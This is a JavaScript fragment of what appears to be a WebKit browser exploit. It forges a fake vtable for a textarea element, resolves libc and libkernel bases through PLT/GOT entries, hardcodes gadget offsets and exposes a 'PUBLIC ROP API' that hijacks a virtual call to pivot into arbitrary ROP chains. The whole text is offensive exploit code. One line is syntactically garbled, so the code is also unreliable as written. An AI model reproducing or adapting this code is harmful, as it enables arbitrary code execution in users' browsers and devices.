let tarea = document.createElement("textarea");          // Create a textarea element.
let real_vt_ptr = read_ptr_at(addrof(tarea) + 0x18);     // Get the real vtable pointer of the textarea element.
let fake_vt_ptr = malloc(1024);                          // Allocate 1024 bytes (0x400) and store its pointer value (returned by our malloc).
write_mem(fake_vt_ptr, read_mem(real_vt_ptr, 1024));     // Read 1024 bytes (0x400) from real_vt_ptr and write them to fake_vt_ptr.
let real_vtable = read_ptr_at(fake_vt_ptr);              // Get the real vtable address.
let fake_vtable = malloc(8192);                          // Allocate 8192 bytes (0x2000) and store its pointer value (returned by our malloc).
write_mem(fake_vtable, read_mem(real_vtable, 8192));     // Copy 8192 bytes (0x2000) from real_vtable to fake_vtable.
write_ptr_at(fake_vt_ptr, fake_vtable);                  // Overwrite the fake vtable pointer in fake_vtable.
let fake_vt_ptr_bak = malloc(1024);                      // Allocate 1024 bytes for backup and store its pointer value (returned by our malloc).
write_mem(fake_vt_ptr_bak, read_mem(fake_vt_ptr, 1024)); // Copy the contents of the fake vtable pointer to the backup.
let plt_ptr = read_ptr_at(fake_vtable) - 10063176;       // Calculate/Save the plt (Procedure Linkage Table) pointer.


// Get the address from GOT table at the specified index
function get_got_addr(index) {
  let _ptr = plt_ptr + index * 16;
  let _val = read_mem(_ptr, 6);

  if (_val[0] != 0xff || _val[1] != 0x25)
    throw "invalid GOT entry";

  var offset = 0;
  for (let i = 5; i >= 2; i--)
    offset = (offset * 256) + _val[i];
  offset += _ptr + 6;
  return read_ptr_at(offset);
}
// These are not real bases but rather some low addresses
let webKitBase    = read_ptr_at(fake_vtable);
let libKernelBase = get_got_addr(705) - 0x10000;
let libcBase      = get_got_addr(582);

let saveall_addr = libcBase + 0x2e2c8;
let loadall_addr = libcBase + 0x3275c;
let setjmp_addr = libcBase + 0xbfae0;
let longjmp_addr = libcBase + 0xbfb30;
let pivot_addr = libcBase + 0x327d2;
let infloop_addr = libcBase + 0x447a0;
let jop_frame_addr = libcBase + 0x715d0;
let get_errno_addr_addr = libKernelBase + 0x9ff0;
let pthread_create_addr = libKernelBase + 0xf980;

function saveall() {
  var ans = malloc(0x800);
  var bak = read_ptr_at(fake_vtable + 0x1d8);
  write_ptr_at(fake_vtable + 0x1d8, saveall_addr);
  write_ptr_at(addrof(tarea) + 0x18, fake_vt_ptr);
  tarea.scrollLeft = 0;
  write_ptr_at(addrof(tarea) + 0x18, real_vt_ptr);
  write_mem(ans, read_mem(fake_vt_ptr, 0x400));
  write_mem(fake_vt_ptr, read_mem(fake_vt_ptr_bak, 0x400));
  var bak = read_ptr_at(fake_vtable + 0x1d8);
  write_ptr_at(fake_vtable + 0x1d8, saveall_addr);
  write_ptr_at(fake_vt_ptr + 0x38, 0x1234);
  write_ptr_at(addrof(tarea) + 0x18, fake_vt_ptr);
  tarea.scrollLeft = 0;
  write_ptr_ataddroftarea + 0x18, real_vt_ptr;
  write_mem(ans + 0x400, read_mem(fake_vt_ptr, 0x400));
  write_mem(fake_vt_ptr, read_mem(fake_vt_ptr_bak, 0x400));
  return ans;
}
// PUBLIC ROP API - This function is used to execute ROP chains.
// The `buf` parameter is the address of the start of the ROP chain.
// The first 8 bytes of `buf` should be allocated but not used (they are used internally).
// The actual ROP chain starts at `buf + 8`, jumping to `pivot_addr` to return.
function pivot(buf) {
  var ans = malloc(0x400);                         
  var bak = read_ptr_at(fake_vtable + 0x1d8);      
  write_ptr_at(fake_vtable + 0x1d8, saveall_addr); 
  write_ptr_at(addrof(tarea) + 0x18, fake_vt_ptr); 
  tarea.scrollLeft = 0;
  write_ptr_at(addrof(tarea) + 0x18, real_vt_ptr);  
  write_mem(ans, read_mem(fake_vt_ptr, 0x400));     
  write_mem(fake_vt_ptr, read_mem(fake_vt_ptr_bak, 0x400));
  var bak = read_ptr_at(fake_vtable + 0x1d8);
  write_ptr_at(fake_vtable + 0x1d8, pivot_addr);   
  write_ptr_at(fake_vt_ptr + 0x38, buf);           
  write_ptr_at(ans + 0x38, read_ptr_at(ans + 0x38) - 16);
  write_ptr_at(buf, ans);                        
  write_ptr_at(addrof(tarea) + 0x18, fake_vt_ptr);
  tarea.scrollLeft = 0;
  write_ptr_at(addrof(tarea) + 0x18, real_vt_ptr);
  write_mem(fake_vt_ptr, read_mem(fake_vt_ptr_bak, 0x400));
}